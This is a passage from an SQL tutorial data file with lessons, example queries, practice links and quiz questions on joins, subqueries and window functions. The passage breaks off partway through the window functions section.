Departments:\nemp_id | name | dept_id   dept_id | dept_name\n1      | Alice | 10       10      | Engineering\n2      | Bob   | 20       20      | Sales\n3      | Carol | 30       40      | Marketing\n4      | Dave  | NULL</div></div><div class="learn-section"><div class="learn-h">Types of Joins</div><table class="learn-table"><tr><th>Join Type</th><th>Returns</th><th>NULL behavior</th></tr><tr><td>INNER JOIN</td><td>Only matching rows from both tables</td><td>Excludes non-matching rows</td></tr><tr><td>LEFT (OUTER) JOIN</td><td>All rows from left table + matching from right</td><td>NULLs for non-matching right columns</td></tr><tr><td>RIGHT (OUTER) JOIN</td><td>All rows from right table + matching from left</td><td>NULLs for non-matching left columns</td></tr><tr><td>FULL (OUTER) JOIN</td><td>All rows from both tables</td><td>NULLs where no match on either side</td></tr><tr><td>CROSS JOIN</td><td>Cartesian product of both tables</td><td>Every row paired with every other row</td></tr><tr><td>SELF JOIN</td><td>A table joined with itself</td><td>Useful for hierarchical data</td></tr></table></div><div class="learn-section"><div class="learn-h">INNER JOIN</div><p class="learn-p">Returns only the rows where the join condition is satisfied in <b>both</b> tables.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e\nINNER JOIN Departments d ON e.dept_id = d.dept_id;\n-- Result: Alice-Engineering, Bob-Sales\n-- Carol (dept 30 not in Departments) and Dave (NULL dept) excluded\n-- Marketing (dept 40 not in Employees) excluded</div><div class="learn-tip"><b>Tip:</b> INNER JOIN is the default join type. Writing just <code>JOIN</code> is equivalent to <code>INNER JOIN</code>.</div></div><div class="learn-section"><div class="learn-h">LEFT JOIN (LEFT OUTER JOIN)</div><p class="learn-p">Returns <b>all rows from the left table</b> and matching rows from the right table. If no match, right-side columns are NULL.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e\nLEFT JOIN Departments d ON e.dept_id = d.dept_id;\n-- Result:\n-- Alice - Engineering\n-- Bob   - Sales\n-- Carol - NULL (dept 30 has no match)\n-- Dave  - NULL (dept is NULL)</div><p class="learn-p"><b>Finding rows with no match</b> (anti-join pattern):</p><div class="learn-code">-- Employees not in any department\nSELECT e.name\nFROM Employees e\nLEFT JOIN Departments d ON e.dept_id = d.dept_id\nWHERE d.dept_id IS NULL;</div></div><div class="learn-section"><div class="learn-h">RIGHT JOIN and FULL OUTER JOIN</div><p class="learn-p"><b>RIGHT JOIN</b> is the mirror of LEFT JOIN — all rows from the right table, matching rows from the left.</p><p class="learn-p"><b>FULL OUTER JOIN</b> returns all rows from both tables, with NULLs where there\'s no match. MySQL does not support FULL OUTER JOIN directly — you simulate it with UNION of LEFT and RIGHT joins.</p><div class="learn-code">-- Simulating FULL OUTER JOIN in MySQL\nSELECT e.name, d.dept_name\nFROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id\nUNION\nSELECT e.name, d.dept_name\nFROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;</div></div><div class="learn-section"><div class="learn-h">CROSS JOIN</div><p class="learn-p"><b>CROSS JOIN</b> produces the <b>Cartesian product</b> — every row of one table paired with every row of the other. If table A has m rows and table B has n rows, the result has m × n rows.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e CROSS JOIN Departments d;\n-- Returns 4 × 3 = 12 rows</div><div class="learn-warn"><b>Warning:</b> CROSS JOIN on large tables can produce enormous result sets. Use with caution. It is useful for generating combinations (e.g., all possible product-size-color combos).</div></div><div class="learn-section"><div class="learn-h">SELF JOIN</div><p class="learn-p">A <b>self join</b> joins a table with itself. Essential for hierarchical or comparative queries.</p><div class="learn-code">-- Find employees who earn more than their manager\nSELECT e.name AS employee, m.name AS manager\nFROM Employees e\nINNER JOIN Employees m ON e.manager_id = m.emp_id\nWHERE e.salary &gt; m.salary;</div></div><div class="learn-section"><div class="learn-h">NATURAL JOIN and USING</div><p class="learn-p"><b>NATURAL JOIN</b> automatically joins on columns with the same name. <b>USING</b> lets you specify which common column(s) to join on.</p><div class="learn-code">SELECT * FROM Employees NATURAL JOIN Departments;\n-- Joins on dept_id (common column)\n\nSELECT * FROM Employees JOIN Departments USING (dept_id);\n-- Explicit: join on dept_id</div><div class="learn-warn"><b>Warning:</b> Avoid NATURAL JOIN in production — if someone adds a column with the same name to both tables, the join condition silently changes. Always use explicit ON or USING.</div></div><div class="learn-section"><div class="learn-h">Join Performance Considerations</div><p class="learn-p">The DBMS typically implements joins using one of three algorithms:</p><ul class="learn-list"><li><b>Nested Loop Join</b> — For each row in the outer table, scan the inner table. <span class="learn-complexity">O(m × n)</span> in the worst case. Good when one table is small or an index exists.</li><li><b>Hash Join</b> — Build a hash table on the smaller table, probe with the larger. <span class="learn-complexity">O(m + n)</span>. Best for equi-joins on large tables without indexes.</li><li><b>Sort-Merge Join</b> — Sort both tables on the join key, then merge. <span class="learn-complexity">O(m log m + n log n)</span>. Good when data is already sorted or indexes exist.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between INNER JOIN and LEFT JOIN?</b><br>A: INNER JOIN returns only rows with matching keys in both tables. LEFT JOIN returns all rows from the left table; if no match exists in the right table, right-side columns are filled with NULL. Use LEFT JOIN when you need to preserve all rows from one table regardless of matches.</p><p class="learn-p"><b>Q2: How do you find rows in table A that have no corresponding row in table B?</b><br>A: Use an anti-join pattern: <code>SELECT a.* FROM A a LEFT JOIN B b ON a.id = b.a_id WHERE b.a_id IS NULL</code>. Alternatively, use <code>NOT EXISTS (SELECT 1 FROM B WHERE B.a_id = A.id)</code>. Both are efficient; NOT EXISTS may perform better with proper indexing.</p><p class="learn-p"><b>Q3: Can NULL join keys match in a JOIN?</b><br>A: No. Since NULL = NULL evaluates to NULL (not TRUE), rows with NULL join keys never match in any join type. In a LEFT JOIN, such rows from the left table appear in the result with NULLs for right-side columns, but they do not match any right-side row.</p><p class="learn-p"><b>Q4: If table A has 1000 rows and table B has 500 rows, what is the maximum number of rows from an INNER JOIN?</b><br>A: It depends on the join keys. If the join is on a non-unique key, the maximum is 1000 &times; 500 = 500,000 (every row matches every other). If both keys are unique (1:1), the maximum is 500 (limited by the smaller table). Understanding cardinality is crucial for predicting result sizes.</p><p class="learn-p"><b>Q5: What is a self join? Give a real-world example.</b><br>A: A self join joins a table with itself using different aliases. Classic example: finding employees who earn more than their manager. <code>SELECT e.name FROM Employees e JOIN Employees m ON e.manager_id = m.emp_id WHERE e.salary &gt; m.salary</code>. Also used for finding pairs, hierarchies, and sequential comparisons.</p><p class="learn-p"><b>Q6: Why should you avoid NATURAL JOIN in production code?</b><br>A: NATURAL JOIN automatically joins on all columns with matching names. If someone later adds a column with the same name to both tables, the join condition silently changes, potentially producing incorrect results. Always use explicit ON or USING clauses.</p><p class="learn-p"><b>Q7: How does the database engine choose between Nested Loop, Hash Join, and Sort-Merge Join?</b><br>A: The query optimizer considers table sizes, available indexes, and memory. Nested Loop is preferred when one table is small or an index exists on the join key. Hash Join is best for large unsorted tables with equi-joins. Sort-Merge is efficient when both inputs are already sorted or can leverage existing indexes.</p></div>',
          code: `-- =============================================
-- Joins: Complete Examples
-- =============================================

-- Setup
CREATE TABLE Departments (
    dept_id   INT PRIMARY KEY,
    dept_name VARCHAR(100)
);
CREATE TABLE Employees (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100),
    dept_id    INT,
    salary     DECIMAL(10,2),
    manager_id INT,
    FOREIGN KEY (dept_id) REFERENCES Departments(dept_id),
    FOREIGN KEY (manager_id) REFERENCES Employees(emp_id)
);

INSERT INTO Departments VALUES (10,'Engineering'),(20,'Sales'),(30,'HR'),(40,'Marketing');
INSERT INTO Employees VALUES
(1,'Alice',10,95000,NULL), (2,'Bob',20,72000,1),
(3,'Carol',10,105000,1),   (4,'Dave',30,68000,2),
(5,'Eve',10,110000,1),     (6,'Frank',NULL,75000,3);

-- INNER JOIN
SELECT e.name, d.dept_name
FROM Employees e INNER JOIN Departments d ON e.dept_id = d.dept_id;

-- LEFT JOIN (all employees, even those without a department)
SELECT e.name, COALESCE(d.dept_name, 'No Dept') AS department
FROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id;

-- Anti-join: departments with no employees
SELECT d.dept_name
FROM Departments d LEFT JOIN Employees e ON d.dept_id = e.dept_id
WHERE e.emp_id IS NULL;

-- RIGHT JOIN
SELECT e.name, d.dept_name
FROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;

-- FULL OUTER JOIN (MySQL simulation)
SELECT e.name, d.dept_name
FROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id
UNION
SELECT e.name, d.dept_name
FROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;

-- CROSS JOIN
SELECT e.name, d.dept_name
FROM Employees e CROSS JOIN Departments d;

-- SELF JOIN: employee with their manager's name
SELECT e.name AS employee, m.name AS manager
FROM Employees e
LEFT JOIN Employees m ON e.manager_id = m.emp_id;

-- SELF JOIN: employees earning more than their manager
SELECT e.name AS employee, e.salary AS emp_salary,
       m.name AS manager, m.salary AS mgr_salary
FROM Employees e
INNER JOIN Employees m ON e.manager_id = m.emp_id
WHERE e.salary > m.salary;

-- Multi-table join
SELECT e.name, d.dept_name, m.name AS manager_name
FROM Employees e
LEFT JOIN Departments d ON e.dept_id = d.dept_id
LEFT JOIN Employees m ON e.manager_id = m.emp_id;

-- USING clause
SELECT name, dept_name
FROM Employees JOIN Departments USING (dept_id);`,
          problems: [
            ['Combine Two Tables - LeetCode', 'https://leetcode.com/problems/combine-two-tables/', 'Easy'],
            ['Employees Earning More Than Managers', 'https://leetcode.com/problems/employees-earning-more-than-their-managers/', 'Easy'],
            ['Department Highest Salary', 'https://leetcode.com/problems/department-highest-salary/', 'Hard'],
            ['African Cities - HackerRank', 'https://www.hackerrank.com/challenges/african-cities/problem', 'Easy'],
            ['Customers Who Never Order', 'https://leetcode.com/problems/customers-who-never-order/', 'Easy'],
            ['Delete Duplicate Emails', 'https://leetcode.com/problems/delete-duplicate-emails/', 'Easy']
          ],
          mcqs: [
            {q: 'Which join returns all rows from both tables, filling NULLs where there is no match?', o: ['INNER JOIN', 'LEFT JOIN', 'CROSS JOIN', 'FULL OUTER JOIN'], a: 3},
            {q: 'Table A has 5 rows and Table B has 4 rows. How many rows does CROSS JOIN produce?', o: ['5', '9', '20', '4'], a: 2},
            {q: 'Which of the following is an anti-join pattern?', o: ['INNER JOIN ... WHERE pk IS NOT NULL', 'LEFT JOIN ... WHERE right_table.pk IS NULL', 'CROSS JOIN ... WHERE 1=1', 'RIGHT JOIN ... WHERE left_table.pk IS NOT NULL'], a: 1},
            {q: 'In a LEFT JOIN, if a row from the left table has no match in the right table, what appears in the right table columns?', o: ['An empty string', 'Zero', 'NULL', 'The row is excluded'], a: 2},
            {q: 'Which join type can be simulated in MySQL using UNION of LEFT JOIN and RIGHT JOIN?', o: ['INNER JOIN', 'CROSS JOIN', 'FULL OUTER JOIN', 'NATURAL JOIN'], a: 2},
            {q: 'When two tables each have NULL values in the join column, which join will pair them?', o: ['INNER JOIN', 'LEFT JOIN', 'FULL OUTER JOIN', 'None — NULL never matches NULL in a join condition'], a: 3},
            {q: 'What is the result of joining an empty table with a non-empty table using INNER JOIN?', o: ['All rows from the non-empty table', 'An error', 'An empty result set', 'A Cartesian product'], a: 2},
            {q: 'Writing JOIN without specifying INNER, LEFT, etc. defaults to:', o: ['LEFT JOIN', 'CROSS JOIN', 'INNER JOIN', 'FULL OUTER JOIN'], a: 2}
          ]
        },
        {
          t: 'Subqueries & Nested Queries',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Subqueries are the Swiss Army knife of SQL &mdash; they let you express complex filtering, comparison, and derivation logic that flat queries cannot handle. Analysts use subqueries to find outlier trades (transactions deviating from portfolio averages), detect duplicate records across data feeds, and build derived metrics for risk dashboards. Interview questions frequently require subqueries: "Find employees who earn more than the average of their department," "Find the second highest salary," or "Find departments with no active employees." Understanding when to use correlated vs. non-correlated subqueries, and when to prefer EXISTS over IN, separates competent SQL users from experts.</p></div><div class="learn-section"><div class="learn-h">What are Subqueries?</div><p class="learn-p">A <b>subquery</b> (also called a <b>nested query</b> or <b>inner query</b>) is a query embedded within another SQL query. The outer query is called the <b>main query</b> or <b>parent query</b>. Subqueries can appear in SELECT, FROM, WHERE, and HAVING clauses.</p><p class="learn-p">Subqueries are classified by:</p><ul class="learn-list"><li><b>Location</b>: WHERE subquery, FROM subquery (derived table), SELECT subquery (scalar)</li><li><b>Correlation</b>: Correlated vs Non-correlated</li><li><b>Return type</b>: Scalar (single value), Row, Table</li></ul></div><div class="learn-section"><div class="learn-h">Non-Correlated Subqueries</div><p class="learn-p">A <b>non-correlated subquery</b> is independent of the outer query. It executes once, and the result is used by the outer query.</p><div class="learn-code">-- Employees earning above the average salary\nSELECT name, salary\nFROM Employees\nWHERE salary &gt; (SELECT AVG(salary) FROM Employees);\n\n-- Employees in the Engineering department\nSELECT name FROM Employees\nWHERE dept_id IN (SELECT dept_id FROM Departments WHERE dept_name = \'Engineering\');</div><p class="learn-p"><b>Operators with subqueries:</b></p><ul class="learn-list"><li><code>IN</code> — Check if value is in the subquery result set</li><li><code>NOT IN</code> — Check if value is NOT in the result set</li><li><code>ANY / SOME</code> — True if comparison holds for at least one value</li><li><code>ALL</code> — True if comparison holds for every value</li><li><code>EXISTS</code> — True if the subquery returns at least one row</li></ul><div class="learn-warn"><b>Warning:</b> <code>NOT IN</code> fails silently when the subquery returns NULL values. Always filter NULLs: <code>WHERE col NOT IN (SELECT col FROM ... WHERE col IS NOT NULL)</code> or use <code>NOT EXISTS</code> instead.</div></div><div class="learn-section"><div class="learn-h">Correlated Subqueries</div><p class="learn-p">A <b>correlated subquery</b> references columns from the outer query. It executes <b>once for each row</b> of the outer query, making it potentially slower.</p><div class="learn-code">-- Employees earning more than the average salary of their department\nSELECT e.name, e.salary, e.dept_id\nFROM Employees e\nWHERE e.salary &gt; (\n    SELECT AVG(e2.salary)\n    FROM Employees e2\n    WHERE e2.dept_id = e.dept_id  -- correlated: references outer e\n);</div><div class="learn-tip"><b>Tip:</b> You can often rewrite correlated subqueries as JOINs for better performance. The optimizer may do this automatically, but it\'s good practice to know both forms.</div></div><div class="learn-section"><div class="learn-h">EXISTS and NOT EXISTS</div><p class="learn-p"><b>EXISTS</b> returns TRUE if the subquery returns at least one row. It is often more efficient than IN for correlated checks because it short-circuits (stops as soon as one match is found).</p><div class="learn-code">-- Departments that have at least one employee\nSELECT d.dept_name\nFROM Departments d\nWHERE EXISTS (\n    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id\n);\n\n-- Departments with no employees\nSELECT d.dept_name\nFROM Departments d\nWHERE NOT EXISTS (\n    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id\n);</div></div><div class="learn-section"><div class="learn-h">Subqueries in FROM (Derived Tables)</div><p class="learn-p">A subquery in the FROM clause creates a <b>derived table</b> (also called an <b>inline view</b>). It must have an alias.</p><div class="learn-code">-- Average of department averages\nSELECT AVG(dept_avg) AS avg_of_averages\nFROM (\n    SELECT dept_id, AVG(salary) AS dept_avg\n    FROM Employees\n    GROUP BY dept_id\n) AS dept_averages;</div></div><div class="learn-section"><div class="learn-h">Subqueries in SELECT (Scalar Subqueries)</div><p class="learn-p">A <b>scalar subquery</b> returns a single value and can be used in the SELECT list.</p><div class="learn-code">-- Each employee with their department\'s average salary\nSELECT name, salary,\n    (SELECT AVG(salary) FROM Employees e2\n     WHERE e2.dept_id = e.dept_id) AS dept_avg\nFROM Employees e;</div><div class="learn-warn"><b>Warning:</b> A scalar subquery must return exactly one row and one column. If it returns more, you get a runtime error.</div></div><div class="learn-section"><div class="learn-h">Common Subquery Patterns for Interviews</div><p class="learn-p">These patterns are frequently tested:</p><ol class="learn-list"><li><b>Nth highest salary</b>: Use LIMIT with OFFSET or a correlated subquery</li><li><b>Top N per group</b>: Use correlated subquery counting how many in the same group are higher</li><li><b>Duplicate detection</b>: GROUP BY + HAVING COUNT &gt; 1</li><li><b>Anti-join</b>: NOT EXISTS or LEFT JOIN ... WHERE pk IS NULL</li></ol><div class="learn-code">-- Second highest salary\nSELECT MAX(salary) AS second_highest\nFROM Employees\nWHERE salary &lt; (SELECT MAX(salary) FROM Employees);\n\n-- Alternative: using LIMIT OFFSET\nSELECT DISTINCT salary FROM Employees\nORDER BY salary DESC LIMIT 1 OFFSET 1;</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between a correlated and non-correlated subquery?</b><br>A: A non-correlated subquery is independent of the outer query &mdash; it executes once and its result is reused. A correlated subquery references columns from the outer query and executes once per row of the outer query, making it potentially O(n &times; m) in cost. Example of correlated: finding employees earning above their department average.</p><p class="learn-p"><b>Q2: Why does NOT IN fail with NULLs, and what should you use instead?</b><br>A: If the subquery returns any NULL value, <code>NOT IN</code> returns no rows because <code>x NOT IN (1, NULL)</code> evaluates to UNKNOWN for any x (since x &lt;&gt; NULL is UNKNOWN). Use <code>NOT EXISTS</code> instead, which correctly handles NULLs by testing for row existence rather than value comparison.</p><p class="learn-p"><b>Q3: How would you find the Nth highest salary?</b><br>A: Three approaches: (1) <code>SELECT DISTINCT salary FROM Employees ORDER BY salary DESC LIMIT 1 OFFSET N-1</code>; (2) Correlated subquery: <code>WHERE (SELECT COUNT(DISTINCT salary) FROM Employees e2 WHERE e2.salary &gt; e1.salary) = N-1</code>; (3) Using DENSE_RANK() window function and filtering where rank = N. The window function approach is cleanest and handles ties properly.</p><p class="learn-p"><b>Q4: When should you use EXISTS vs IN?</b><br>A: EXISTS is generally preferred for correlated checks because it short-circuits (stops scanning once a match is found). IN is fine for small static lists or non-correlated subqueries returning few rows. EXISTS handles NULLs correctly while IN does not with NOT IN. Modern optimizers often transform one into the other, but understanding the semantic difference matters in interviews.</p><p class="learn-p"><b>Q5: What is a derived table and when would you use one?</b><br>A: A derived table is a subquery in the FROM clause that acts as a temporary, unnamed table. It must have an alias. Use it when you need to aggregate aggregates (e.g., average of department averages), apply filtering on computed columns, or create intermediate result sets. Example: <code>SELECT AVG(dept_avg) FROM (SELECT dept_id, AVG(salary) AS dept_avg FROM Emp GROUP BY dept_id) t</code>.</p><p class="learn-p"><b>Q6: Can you rewrite a correlated subquery as a JOIN? Why would you?</b><br>A: Yes, most correlated subqueries can be rewritten as JOINs. The JOIN version is often more efficient because the optimizer can choose a Hash or Sort-Merge join algorithm, whereas correlated subqueries may force a Nested Loop execution. Example: <code>WHERE salary &gt; (SELECT AVG(salary) FROM Emp e2 WHERE e2.dept = e1.dept)</code> can become a JOIN with a pre-computed department average table.</p><p class="learn-p"><b>Q7: What is the difference between ANY and ALL operators?</b><br>A: <code>&gt; ANY (subquery)</code> returns TRUE if the value is greater than at least one value in the subquery result (equivalent to &gt; MIN). <code>&gt; ALL (subquery)</code> returns TRUE only if the value is greater than every value in the result (equivalent to &gt; MAX). If the subquery returns an empty set, ALL returns TRUE and ANY returns FALSE.</p></div>',
          code: `-- =============================================
-- Subqueries & Nested Queries
-- =============================================

-- 1. Non-correlated: employees earning above average
SELECT name, salary
FROM Employees
WHERE salary > (SELECT AVG(salary) FROM Employees);

-- 2. IN subquery: employees in Engineering or Sales
SELECT name FROM Employees
WHERE dept_id IN (
    SELECT dept_id FROM Departments
    WHERE dept_name IN ('Engineering', 'Sales')
);

-- 3. ALL: employees earning more than everyone in Sales
SELECT name, salary FROM Employees
WHERE salary > ALL (
    SELECT salary FROM Employees e
    JOIN Departments d ON e.dept_id = d.dept_id
    WHERE d.dept_name = 'Sales'
);

-- 4. ANY: employees earning more than at least one person in Engineering
SELECT name, salary FROM Employees
WHERE salary > ANY (
    SELECT salary FROM Employees e
    JOIN Departments d ON e.dept_id = d.dept_id
    WHERE d.dept_name = 'Engineering'
);

-- 5. Correlated: employees earning more than their dept average
SELECT e.name, e.salary, e.dept_id
FROM Employees e
WHERE e.salary > (
    SELECT AVG(e2.salary)
    FROM Employees e2
    WHERE e2.dept_id = e.dept_id
);

-- 6. EXISTS: departments that have employees
SELECT d.dept_name
FROM Departments d
WHERE EXISTS (
    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id
);

-- 7. NOT EXISTS: departments with no employees
SELECT d.dept_name
FROM Departments d
WHERE NOT EXISTS (
    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id
);

-- 8. Derived table: average of department averages
SELECT ROUND(AVG(dept_avg), 2) AS overall_avg
FROM (
    SELECT dept_id, AVG(salary) AS dept_avg
    FROM Employees
    GROUP BY dept_id
) AS dept_averages;

-- 9. Scalar subquery in SELECT
SELECT e.name, e.salary,
    (SELECT AVG(salary) FROM Employees e2
     WHERE e2.dept_id = e.dept_id) AS dept_avg,
    e.salary - (SELECT AVG(salary) FROM Employees e2
     WHERE e2.dept_id = e.dept_id) AS diff_from_avg
FROM Employees e;

-- 10. Nth highest salary (3rd highest)
SELECT DISTINCT salary FROM Employees
ORDER BY salary DESC LIMIT 1 OFFSET 2;

-- 11. Find duplicates
SELECT email, COUNT(*) AS cnt
FROM Employees
GROUP BY email
HAVING COUNT(*) > 1;

-- 12. Delete duplicates (keep the one with lowest id)
DELETE e1 FROM Employees e1
INNER JOIN Employees e2
ON e1.email = e2.email AND e1.emp_id > e2.emp_id;`,
          problems: [
            ['Nth Highest Salary', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium'],
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Duplicate Emails', 'https://leetcode.com/problems/duplicate-emails/', 'Easy'],
            ['Customers Who Never Order', 'https://leetcode.com/problems/customers-who-never-order/', 'Easy'],
            ['Second Highest Salary', 'https://leetcode.com/problems/second-highest-salary/', 'Medium'],
            ['Employees Earning More Than Managers', 'https://leetcode.com/problems/employees-earning-more-than-their-managers/', 'Easy']
          ],
          mcqs: [
            {q: 'A correlated subquery:', o: ['Executes once for the entire outer query', 'Executes once for each row of the outer query', 'Cannot reference columns from the outer query', 'Is always faster than a non-correlated subquery'], a: 1},
            {q: 'What happens if NOT IN subquery returns a NULL value?', o: ['It returns all rows', 'It returns no rows', 'It throws an error', 'It ignores the NULL and works normally'], a: 1},
            {q: 'Which is generally more efficient for checking existence?', o: ['IN with a subquery', 'EXISTS with a correlated subquery', 'CROSS JOIN', 'They are always equivalent'], a: 1},
            {q: 'A scalar subquery in the SELECT list must return:', o: ['Exactly one column and any number of rows', 'Exactly one row and one column', 'Multiple columns but one row', 'Any number of rows and columns'], a: 1},
            {q: 'What does > ALL (subquery) evaluate to if the subquery returns an empty set?', o: ['FALSE', 'NULL', 'TRUE', 'Error'], a: 2},
            {q: 'A derived table (subquery in FROM) requires:', o: ['No special syntax', 'An alias', 'The TEMPORARY keyword', 'A WHERE clause'], a: 1},
            {q: 'Which approach correctly finds duplicate email addresses?', o: ['SELECT email FROM Employees WHERE COUNT(email) > 1', 'SELECT email FROM Employees GROUP BY email HAVING COUNT(*) > 1', 'SELECT DISTINCT email FROM Employees WHERE email IS NOT NULL', 'SELECT email FROM Employees ORDER BY email LIMIT 2'], a: 1}
          ]
        },
        {
          t: 'Window Functions',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Window functions are the most powerful and frequently tested SQL feature in technical interviews at quantitative firms. They let you compute running totals of portfolio P&amp;L, rank traders by performance within each desk, calculate day-over-day changes in position values, and identify consecutive winning streaks &mdash; all without collapsing rows. Questions like "Find the top 3 earners in each department" or "Compute a 7-day moving average of trade volume" are bread-and-butter interview problems that require window functions for clean solutions. If you can master PARTITION BY, ORDER BY, frame clauses, and the differences between ROW_NUMBER, RANK, and DENSE_RANK, you will handle the majority of advanced SQL interview questions.</p></div><div class="learn-section"><div class="learn-h">Introduction to Window Functions</div><p class="learn-p"><b>Window functions</b> (also called <b>analytic functions</b>) perform calculations across a set of rows related to the current row — called a <b>window</b> or <b>frame</b>. Unlike GROUP BY, window functions do <b>not collapse rows</b>; each row retains its identity in the result.</p><p class="learn-p">Syntax:</p><div class="learn-code">function_name(args) OVER (\n    [PARTITION BY col1, col2, ...]\n    [ORDER BY col3, col4, ...]\n    [ROWS/RANGE BETWEEN ... AND ...]\n)</div><ul class="learn-list"><li><b>PARTITION BY</b> — Divides rows into partitions (like GROUP BY but without collapsing)</li><li><b>ORDER BY</b> — Defines the order within each partition</li><li><b>Frame clause</b> — Defines which rows relative to the current row are included (ROWS BETWEEN, RANGE BETWEEN)</li></ul></div><div class="learn-section"><div class="learn-h">Ranking Functions</div><table class="learn-table"><tr><th>Function</th><th>Description</th><th>Example (salaries: 100, 100, 90, 80)</th></tr><tr><td>ROW_NUMBER()</td><td>Unique sequential number (no ties)</td><td>1, 2, 3, 4</td></tr><tr><td>RANK()</td><td>Rank with gaps for ties</td><td>1, 1, 3, 4</td></tr><tr><td>DENSE_RANK()</td><td>Rank without gaps for ties</td><td>1, 1, 2, 3</td></tr><tr><td>NTILE(n)</td><td>Divide into n roughly equal groups</td><td>NTILE(2): 1,1,2,2</td></tr></table><div class="learn-code">SELECT name, dept_id, salary,\n    ROW_NUMBER() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS row_num,\n    RANK()       OVER (PARTITION BY dept_id ORDER BY salary DESC) AS rnk,\n    DENSE_RANK() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS dense_rnk\nFROM Employees;</div><div class="learn-tip"><b>Tip:</b> The difference between RANK and DENSE_RANK is a classic interview question. RANK skips numbers after ties (1,1,3); DENSE_RANK does not (1,1,2).</div></div><div class="learn-section"><div class="learn-h">Aggregate Window Functions</div><p class="learn-p">Standard aggregates (SUM, AVG, COUNT, MIN, MAX) can be used as window functions:</p><div class="learn-code">SELECT name, salary,\n    SUM(salary) OVER (ORDER BY hire_date) AS running_total,\n    AVG(salary) OVER (PARTITION BY dept_id) AS dept_avg,\n    COUNT(*)    OVER () AS total_employees\nFROM Employees;</div><p class="learn-p">The <b>running total</b> pattern is very common: <code>SUM(col) OVER (ORDER BY date_col)</code> computes a cumulative sum.</p></div><div class="learn-section"><div class="learn-h">Value Functions: LAG, LEAD, FIRST_VALUE, LAST_VALUE</div><p class="learn-p">These functions access values from other rows without a self-join:</p><table class="learn-table"><tr><th>Function</th><th>Description</th></tr><tr><td>LAG(col, n, default)</td><td>Value of col from n rows BEFORE current row</td></tr><tr><td>LEAD(col, n, default)</td><td>Value of col from n rows AFTER current row</td></tr><tr><td>FIRST_VALUE(col)</td><td>Value of col from the first row in the window frame</td></tr><tr><td>LAST_VALUE(col)</td><td>Value of col from the last row in the window frame</td></tr><tr><td>NTH_VALUE(col, n)</td><td>Value of col from the nth row in the window frame</td></tr></table><div class="learn-code">-- Compare each employee\'s salary with previous and next hire\nSELECT name, hire_date, salary,\n    LAG(salary, 1, 0)  OVER (ORDER BY hire_date) AS prev_salary,\n    LEAD(salary, 1, 0) OVER (ORDER BY hire_date) AS next_salary,\n    salary - LAG(salary, 1, 0) OVER (ORDER BY hire_date) AS diff\nFROM Employees;</div><div class="learn-warn"><b>Warning:</b> LAST_VALUE with the default frame (RANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) gives the current row\'s value, not the actual last value. Use <code>ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING</code> to get the true last value.</div></div><div class="learn-section"><div class="learn-h">Window Frame Specification</div><p class="learn-p">The frame clause defines which rows relative to the current row are in the window:</p><div class="learn-code">ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW      -- default for ORDER BY\nROWS BETWEEN 2 PRECEDING AND 2 FOLLOWING               -- 5-row sliding window\nROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING -- entire partition\nRANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW       -- based on value, not position</div><p class="learn-p"><b>ROWS</b> counts physical rows; <b>RANGE</b> considers logical value ranges. For most use cases, ROWS is more predictable.</p><div class="learn-code">-- 3-month moving average\nSELECT month, revenue,\n    AVG(revenue) OVER (\n        ORDER BY month\n        ROWS BETWEEN 2 PRECEDING AND CURRENT ROW\n    ) AS moving_avg_3m\nFROM Monthly_Revenue;</div></div><div class="learn-section"><div class="learn-h">Common Interview Patterns</div><ol class="learn-list"><li><b>Top N per group</b>: Use ROW_NUMBER() OVER (PARTITION BY group_col ORDER BY rank_col) and filter WHERE row_num &lt;= N</li><li><b>Running total</b>: SUM() OVER (ORDER BY date_col)</li><li><b>Year-over-year comparison</b>: LAG(value, 1) OVER (ORDER BY year)</li><li><b>Percentile / quartile</b>: NTILE(4) OVER (ORDER BY salary)</li><li><b>Consecutive sequences</b>: ROW_NUMBER differences</li></ol></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between ROW_NUMBER(), RANK(), and DENSE_RANK()?</b><br>A: For values (100, 100, 90, 80): ROW_NUMBER assigns unique sequential numbers (1,2,3,4) &mdash; ties get arbitrary ordering. RANK assigns 1,1,3,4 &mdash; ties get the same rank, then it skips. DENSE_RANK assigns 1,1,2,3 &mdash; ties get the same rank with no gaps. Use ROW_NUMBER when you need exactly N rows per group (top-N); use DENSE_RANK when you need the Nth distinct value.</p><p class="learn-p"><b>Q2: How do you find the top N earners per department?</b><br>A: Use a subquery with ROW_NUMBER: <code>SELECT * FROM (SELECT *, ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary DESC) AS rn FROM Employees) t WHERE rn &lt;= N</code>. Note: you cannot put WHERE rn &lt;= N in the same SELECT as the window function because window functions execute after WHERE.</p><p class="learn-p"><b>Q3: Why does LAST_VALUE often return the current row\'s value instead of the actual last value?</b><br>A: The default window frame when ORDER BY is specified is <code>RANGE BETWEEN UNBOUNDED PRECEDING AND 